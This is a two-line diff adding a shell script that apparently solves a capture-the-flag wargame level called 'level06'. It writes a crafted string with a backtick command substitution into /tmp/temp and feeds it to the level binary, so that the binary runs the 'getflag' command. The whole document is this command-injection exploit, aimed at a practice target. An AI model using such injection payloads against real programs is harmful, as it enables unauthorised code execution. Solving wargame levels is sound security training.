@@ -1,0 +1,2 @@
+echo '[x ${`getflag`}]' > /tmp/temp
+./level06 /tmp/temp asd
